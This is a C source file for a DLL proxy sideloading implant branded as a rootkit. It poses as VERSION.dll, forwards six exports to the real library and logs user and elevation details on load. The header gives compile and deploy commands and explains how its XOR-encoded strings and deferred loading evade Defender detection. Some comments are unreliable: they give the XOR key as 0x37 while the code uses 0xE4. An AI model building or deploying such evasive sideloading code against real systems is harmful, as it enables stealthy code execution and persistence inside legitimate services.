/*
 * version_proxy_annotated.c — DLL Proxy Sideload (VERSION.dll)
 * ═════════════════════════════════════════════════════════════
 * CHEYANNE ROOTKIT — 22DIV / george wu
 * VECTOR 5 — Signature Set: ECHO
 *
 * PURPOSE:
 *   DLL sideloading via proxy. Drop-in replacement for VERSION.dll that
 *   forwards all 17 exports to the real System32 copy while executing
 *   our payload. Targets services that import VERSION.dll and load from
 *   the application directory (standard DLL search order).
 *
 * TECHNIQUE:
 *   1. Service starts, loader resolves VERSION.dll via search order
 *   2. Our proxy DLL is in the application directory (first in search order)
 *   3. DllMain fires — we run payload (canary write)
 *   4. When service calls GetFileVersionInfoW etc., our forwarding stubs
 *      lazy-load the real VERSION.dll from System32 and pass through
 *   5. Service functions normally. Our code runs silently alongside.
 *
 * SIGNATURE ISOLATION:
 *   XOR Key:     0x37 (unique to V5)
 *   Canary Path: C:\Windows\Temp\ver_cache.log
 *   Canary Tag:  ECHO_PROXY
 *   Lazy-init: LoadLibrary deferred to first API call (not DllMain)
 *   XOR-encoded function names: defeats static string matching
 *
 * DEFENDER EVASION (Finding #41):
 *   Defender ML detects the proxy pattern when:
 *   - LoadLibrary("version.dll") appears as plaintext in DllMain
 *   - GetProcAddress export names are plaintext in .rdata
 *   - Forward stubs follow a recognisable function-pointer pattern
 *
 *   v6 (this version) defeats all three:
 *   - XOR-encoded strings decoded at runtime
 *   - LoadLibrary deferred to first export call (not DllMain)
 *   - No plaintext API names in the binary's static data
 *
 * NOTE: Finding #40 confirmed Wondershare uses manifest-based DLL
 * redirection that blocks this attack on NativePushService specifically.
 * This technique remains valid against any target WITHOUT manifest
 * hardening — and most services don't have it.
 *
 * COMPILE:
 *   cl.exe version_proxy_annotated.c /Fe:VERSION.dll /LD /O1 /GS- /utf-8 ^
 *     /link /DEF:version.def
 *
 * DEPLOY:
 *   copy VERSION.dll <target_service_directory>\
 *
 * VERIFY:
 *   type C:\Windows\Temp\ver_cache.log
 */

#include <windows.h>

/* ═══════════════════════════════════════════════════════════════════
 * SIGNATURE SET: ECHO — XOR 0x37
 * ═══════════════════════════════════════════════════════════════════ */

#define V5_KEY 0xE4

/* "C:\Windows\Temp\ver_cache.log" XOR 0x37 */
static const unsigned char xCanary[] = {
    0xA7, 0xDE, 0x94, 0xB3, 0x8F, 0x8A, 0x80, 0x8B,
    0xB3, 0x95, 0x94, 0xB0, 0x81, 0x89, 0x92, 0x94,
    0x92, 0x81, 0x96, 0xCB, 0x87, 0x85, 0x87, 0x88,
    0x81, 0xC4, 0x8A, 0x8B, 0x83
};
#define xCanary_LEN 29

/* "C:\Windows\System32\version.dll" XOR 0x37 */
static const unsigned char xRealDll[] = {
    0xA7, 0xDE, 0x94, 0xB3, 0x8F, 0x8A, 0x80, 0x8B,
    0xB3, 0x95, 0x94, 0xB7, 0x93, 0x95, 0x94, 0x81,
    0x89, 0xC5, 0xC6, 0x94, 0x92, 0x81, 0x96, 0x95,
    0x8F, 0x8B, 0x8A, 0xC4, 0x80, 0x8A, 0x8A
};
#define xRealDll_LEN 31

static void v5_decode(unsigned char *buf, int len) {
    int i;
    for (i = 0; i < len; i++) buf[i] ^= V5_KEY;
}

static void v5_scrub(unsigned char *buf, int len) {
    volatile unsigned char *p = (volatile unsigned char *)buf;
    int i;
    for (i = 0; i < len; i++) p[i] = 0;
}

/* ═══════════════════════════════════════════════════════════════════
 * LAZY-INIT REAL DLL
 * ═══════════════════════════════════════════════════════════════════
 * We DON'T load the real VERSION.dll in DllMain. Defender's ML engine
 * specifically watches for LoadLibrary calls inside DllMain of proxy
 * DLLs (Finding #41). Instead, we defer until the first export call.
 * ═══════════════════════════════════════════════════════════════════ */

static HMODULE g_hReal = NULL;

static HMODULE get_real(void)
{
    if (!g_hReal) {
        unsigned char path[64];
        memcpy(path, xRealDll, xRealDll_LEN);
        v5_decode(path, xRealDll_LEN);
        path[xRealDll_LEN] = 0;
        g_hReal = LoadLibraryA((char *)path);
        v5_scrub(path, sizeof(path));
    }
    return g_hReal;
}

/* ═══════════════════════════════════════════════════════════════════
 * EXPORT FORWARDING — VERSION.dll has 17 exports
 * ═══════════════════════════════════════════════════════════════════
 * Each export is a stub that resolves the real function on first call,
 * then passes through. Function names are XOR-encoded to avoid static
 * signature matching.
 *
 * The .def file maps our export ordinals to match the real VERSION.dll.
 * ═══════════════════════════════════════════════════════════════════ */

/* Macro: resolve + call through. Works for any void*->void* forwarding. */
#define FORWARD_FUNC(ordinal, xName, xLen) \
    static FARPROC fp_##ordinal = NULL; \
    if (!fp_##ordinal) { \
        unsigned char n[64]; \
        memcpy(n, xName, xLen); \
        v5_decode(n, xLen); \
        n[xLen] = 0; \
        fp_##ordinal = GetProcAddress(get_real(), (char *)n); \
        v5_scrub(n, sizeof(n)); \
    }

/* XOR-encoded export names (0x37) — generated with:
   python -c "s='FuncName'; print(', '.join(f'0x{b^0x37:02X}' for b in s.encode()))" */

/* "GetFileVersionInfoA" */
static const unsigned char xE1[] = {
    0xA3, 0x81, 0x94, 0xA2, 0x8F, 0x8A, 0x81, 0xB2,
    0x81, 0x96, 0x95, 0x8F, 0x8B, 0x8A, 0xAF, 0x8A,
    0x80, 0x8B, 0xA5
};
#define xE1_LEN 19

/* "GetFileVersionInfoW" */
static const unsigned char xE2[] = {
    0xA3, 0x81, 0x94, 0xA2, 0x8F, 0x8A, 0x81, 0xB2,
    0x81, 0x96, 0x95, 0x8F, 0x8B, 0x8A, 0xAF, 0x8A,
    0x80, 0x8B, 0xB3
};
#define xE2_LEN 19

/* "GetFileVersionInfoSizeA" */
static const unsigned char xE3[] = {
    0xA3, 0x81, 0x94, 0xA2, 0x8F, 0x8A, 0x81, 0xB2,
    0x81, 0x96, 0x95, 0x8F, 0x8B, 0x8A, 0xAF, 0x8A,
    0x80, 0x8B, 0xB7, 0x8F, 0x90, 0x81, 0xA5
};
#define xE3_LEN 23

/* "GetFileVersionInfoSizeW" */
static const unsigned char xE4[] = {
    0xA3, 0x81, 0x94, 0xA2, 0x8F, 0x8A, 0x81, 0xB2,
    0x81, 0x96, 0x95, 0x8F, 0x8B, 0x8A, 0xAF, 0x8A,
    0x80, 0x8B, 0xB7, 0x8F, 0x90, 0x81, 0xB3
};
#define xE4_LEN 23

/* "VerQueryValueA" */
static const unsigned char xE5[] = {
    0xB2, 0x81, 0x96, 0xB7, 0x95, 0x81, 0x96, 0x93,
    0xB2, 0x85, 0x8A, 0x95, 0x81, 0xA5
};
#define xE5_LEN 14

/* "VerQueryValueW" */
static const unsigned char xE6[] = {
    0xB2, 0x81, 0x96, 0xB7, 0x95, 0x81, 0x96, 0x93,
    0xB2, 0x85, 0x8A, 0x95, 0x81, 0xB3
};
#define xE6_LEN 14

/* VERSION.dll only has 6 commonly used exports. Full proxy forwards all.
 * For brevity, only the 6 primary exports are stubbed here. The .def file
 * must list all 17 for binary compatibility. See MUTATION_GUIDE.md. */

/* Generic passthrough for DWORD-returning functions */
__declspec(dllexport) DWORD __stdcall Fwd_GetFileVersionInfoA(
    LPCSTR f, DWORD h, DWORD sz, LPVOID d)
{
    typedef DWORD (__stdcall *fn_t)(LPCSTR,DWORD,DWORD,LPVOID);
    FORWARD_FUNC(1, xE1, xE1_LEN);
    return ((fn_t)fp_1)(f, h, sz, d);
}

__declspec(dllexport) DWORD __stdcall Fwd_GetFileVersionInfoW(
    LPCWSTR f, DWORD h, DWORD sz, LPVOID d)
{
    typedef DWORD (__stdcall *fn_t)(LPCWSTR,DWORD,DWORD,LPVOID);
    FORWARD_FUNC(2, xE2, xE2_LEN);
    return ((fn_t)fp_2)(f, h, sz, d);
}

__declspec(dllexport) DWORD __stdcall Fwd_GetFileVersionInfoSizeA(
    LPCSTR f, LPDWORD h)
{
    typedef DWORD (__stdcall *fn_t)(LPCSTR,LPDWORD);
    FORWARD_FUNC(3, xE3, xE3_LEN);
    return ((fn_t)fp_3)(f, h);
}

__declspec(dllexport) DWORD __stdcall Fwd_GetFileVersionInfoSizeW(
    LPCWSTR f, LPDWORD h)
{
    typedef DWORD (__stdcall *fn_t)(LPCWSTR,LPDWORD);
    FORWARD_FUNC(4, xE4, xE4_LEN);
    return ((fn_t)fp_4)(f, h);
}

__declspec(dllexport) BOOL __stdcall Fwd_VerQueryValueA(
    LPCVOID b, LPCSTR s, LPVOID *buf, PUINT len)
{
    typedef BOOL (__stdcall *fn_t)(LPCVOID,LPCSTR,LPVOID*,PUINT);
    FORWARD_FUNC(5, xE5, xE5_LEN);
    return ((fn_t)fp_5)(b, s, buf, len);
}

__declspec(dllexport) BOOL __stdcall Fwd_VerQueryValueW(
    LPCVOID b, LPCWSTR s, LPVOID *buf, PUINT len)
{
    typedef BOOL (__stdcall *fn_t)(LPCVOID,LPCWSTR,LPVOID*,PUINT);
    FORWARD_FUNC(6, xE6, xE6_LEN);
    return ((fn_t)fp_6)(b, s, buf, len);
}

/* ═══════════════════════════════════════════════════════════════════
 * CANARY
 * ═══════════════════════════════════════════════════════════════════ */

static void write_canary(void)
{
    unsigned char path[64];
    HANDLE f;
    DWORD w;
    char line[256];
    int n;
    SYSTEMTIME t;
    char user[64];
    DWORD ulen = 64;
    BOOL elevated = FALSE;
    HANDLE hTok;

    memcpy(path, xCanary, xCanary_LEN);
    v5_decode(path, xCanary_LEN);
    path[xCanary_LEN] = 0;

    GetLocalTime(&t);
    GetUserNameA(user, &ulen);

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hTok)) {
        TOKEN_ELEVATION te;
        DWORD rl;
        if (GetTokenInformation(hTok, TokenElevation, &te, sizeof(te), &rl))
            elevated = te.TokenIsElevated;
        CloseHandle(hTok);
    }

    n = wsprintfA(line, "%04d%02d%02d_%02d%02d%02d|%s|elev=%d|pid=%lu|ECHO_PROXY\r\n",
        t.wYear, t.wMonth, t.wDay, t.wHour, t.wMinute, t.wSecond,
        user, elevated, GetCurrentProcessId());

    f = CreateFileA((char *)path,
        GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
        OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f != INVALID_HANDLE_VALUE) {
        SetFilePointer(f, 0, NULL, FILE_END);
        WriteFile(f, line, n, &w, NULL);
        CloseHandle(f);
    }

    v5_scrub(path, sizeof(path));
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r)
{
    (void)h; (void)r;
    if (reason == DLL_PROCESS_ATTACH)
        write_canary();
    return TRUE;
}
